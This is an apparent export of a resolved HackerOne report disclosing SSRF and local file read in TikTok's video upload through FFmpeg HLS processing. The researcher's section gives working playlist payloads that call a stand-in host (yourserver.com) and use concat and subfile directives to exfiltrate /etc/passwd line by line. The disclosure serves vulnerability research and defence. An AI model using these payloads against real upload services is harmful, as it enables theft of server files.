{
  "id": 1062888,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDYyODg4",
  "url": "https://hackerone.com/reports/1062888",
  "title": "External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2020-12-20T11:13:21.250Z",
  "submitted_at": "2020-12-20T11:13:21.355Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ach",
    "url": "/ach",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 49708,
    "url": "https://hackerone.com/tiktok",
    "handle": "tiktok",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/roYPkZznCDFmy4VGkFPnbDrc/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/roYPkZznCDFmy4VGkFPnbDrc/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "TikTok",
      "twitter_handle": "",
      "website": "http://tiktok.com",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "no-content",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-02-15T20:16:56.169Z",
  "bug_reporter_agreed_on_going_public_at": "2021-01-06T15:46:33.686Z",
  "team_member_agreed_on_going_public_at": "2021-02-15T20:16:56.059Z",
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "",
  "bounty_amount": "2727.0",
  "formatted_bounty": "$2,727",
  "weakness": {
    "id": 68,
    "name": "Server-Side Request Forgery (SSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 143,
  "voters": [
    "osman1337",
    "mole_concept",
    "th3hidd3nmist",
    "milly",
    "ach",
    "pmnh",
    "n1m0",
    "samengmg",
    "pudsec",
    "youstin",
    "and 133 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 7.7,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 50915,
    "asset_type": "URL",
    "asset_identifier": "*.tiktok.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 26663,
      "category": "team",
      "content": "A local file disclosure vulnerability was found which an attacker could have used to upload a payload file via the TikTok website and potentially exfiltrate arbitrary local system files. We thank @ach for reporting this to our team and confirming the resolution. ",
      "user": {
        "id": 1287576,
        "username": "tt_sr",
        "name": "Suhana Hyder",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2020-08-14T21:25:36.459Z",
        "url": "https://hackerone.com/tt_sr",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "xtralarge": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "id": 26624,
      "category": "researcher",
      "content": "# Summary:\nFFmpeg is a free and open-source software project consisting of a large suite of libraries and programs for handling video, audio, and other multimedia files and streams. At its core is the FFmpeg program itself, designed for command-line-based processing of video and audio files. It is widely used for format transcoding, basic editing (trimming and concatenation), video scaling, video post-production effects and standards compliance (SMPTE, ITU).\n\nFFmpeg includes libavcodec, an audio/video codec library used by many commercial and free software products, libavformat (Lavf), an audio/video container mux and demux library, and the core ffmpeg command-line program for transcoding multimedia files.\n\nThe SSRF-LFR in FFmpeg is pretty well known and old vulnerability but luckily I was able to find and exploit it in `https://www.tiktok.com/upload/` functionality.\n\nAt first I couldn't exploit LFR and only got SSRF to my collaborator server.\nAfter some digging I found out that the problem was that my text editor added new line(\\r\\n) at the end of `header.m3u8` file.\n\nAlso this vulnerability leads to DOS but I decided not to test this issue.\n\n# Exploitation:\n\n## SSRF\nFor SSRF you just need to upload `.avi` file with injected HLS-directives inside.\n**Example:**\n```\n#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\nhttp://yourserver.com/anything\n#EXT-X-ENDLIST\n```\n\nAfter that you will get a callback to your server. The user-agent will have Lavf(libavformat) version.\n\n## LFR\nIn order to exploit LFR you need to host special file on your server and refer to it inside the video you wanna upload.\n\n**Example:**\n`header.m3u8` file you need to host at your server:\n```\n#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:,\nhttp://yourserver.com?\n```\n**Make sure that your `header.m3u8` doesn't have anything after `3f` byte(`?` sign). You can check that with `hexdump -C header.m3u8`**\n\n`video.avi`\nYou need to inject these commands inside `video.avi` file:\n```\n#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\nconcat:http://yourserver.com/header.m3u8|file:///etc/passwd\n#EXT-X-ENDLIST\n```\n\nAfter uploading `video.avi` you will receive **only first line** of `/etc/passwd` file.\n\nBut we need more, right?\n\nTo exfiltrate the whole file(any file). We can use two techniques. \n\n1. using `header.y4m`(you can find it in referenced links):\n```\nYUV4MPEG2 W30 H30 F25:1 Ip A0:0 Cmono\nFRAME\n```\nThis didn't work for me.\n\n### Subfile technique\n\nIn order to exfiltrate the whole file line by line you can use this directives:\n```\n#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\nconcat:http://yourserver.com/header.m3u8|subfile,,start,1,end,10000,,:/etc/passwd\n#EXT-X-ENDLIST\n```\n`start` parameter and it's value(1) means that we start from first symbol of the file and the `end` parameter symbolises the end of the line. There is no need to know exact `end` value. After getting first line you can easily calculate the `start` value of second line and so on.\nFor example for the second line our command wiil be something like:\n`concat:http://yourserver.com/header.m3u8|subfile,,start,70,end,10000,,:/etc/passwd`\n\n\nIn some cases you can extract the whole file with this directive inside you video file:\n\n```\n#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:1.0\n/anything.txt\n#EXTINF:1.0\nfile:///etc/passwd\n#EXT-X-ENDLIST\n```\nYou could see the whole `/etc/passwd` as video preview.\nBut in our case the vulnerable software worked while our video got converted on the server side.\n\nAll of the examples of video files and files with directives you can find in referenced links and by just googling it.\n\n# References\n* https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yngwie_ffmpeg.pdf\n* https://www.blackhat.com/docs/us-16/materials/us-16-Ermishkin-Viral-Video-Exploiting-Ssrf-In-Video-Converters.pdf\n* https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit\n* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS",
      "user": {
        "id": 248980,
        "username": "ach",
        "name": "",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2018-03-08T11:58:47.832Z",
        "url": "https://hackerone.com/ach",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "xtralarge": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
